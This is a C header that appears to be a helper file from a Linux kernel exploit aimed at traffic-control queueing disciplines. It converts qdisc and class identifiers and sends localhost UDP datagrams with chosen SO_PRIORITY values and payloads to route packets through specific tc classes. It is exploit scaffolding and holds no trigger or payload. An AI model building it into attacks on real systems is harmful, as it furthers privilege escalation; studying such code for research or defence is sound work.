#ifndef PWN_REPEAT_REQ_H
#define PWN_REPEAT_REQ_H

// get qdisc handle
__u32 gqh(const char* s_handle) {
	__u32 result;
	SYSOK(get_qdisc_handle(&result, s_handle));
	return result;
}

// get class id
__u32 gci(const char* s_class) {
	__u32 result;
	SYSOK(get_tc_classid(&result, s_class));
	return result;
}

__u32 get_id(const char* s_class) {
	if (s_class[2] == '0') {
		// eg 2.0
		return gqh(s_class);
	} else {
		// eg 2.1
		return gci(s_class);
	}
}

int send_req(int priority) {
    int sock;
    struct sockaddr_in server;
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Failed to create socket");
        return 1;
    }
    
    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0) {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }
    
    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        return 1;
    }
    
    // Send empty datagram
    if (sendto(sock, "", 0, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Failed to send");
        close(sock);
        return 1;
    }
    
    close(sock);
    return 0;
}

int send_req_with_payload(int priority, const char* payload, const size_t payload_len) {
    int sock;
    struct sockaddr_in server;
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Failed to create socket");
        return 1;
    }
    
    // Set socket priority (equivalent to 0x10001)
    // int priority = 0x10001;
    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0) {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }
    
    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        return 1;
    }
    
    // Send empty datagram
    if (sendto(sock, payload, payload_len, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Failed to send");
        close(sock);
        return 1;
    }
    
    close(sock);
    return 0;
}

#endif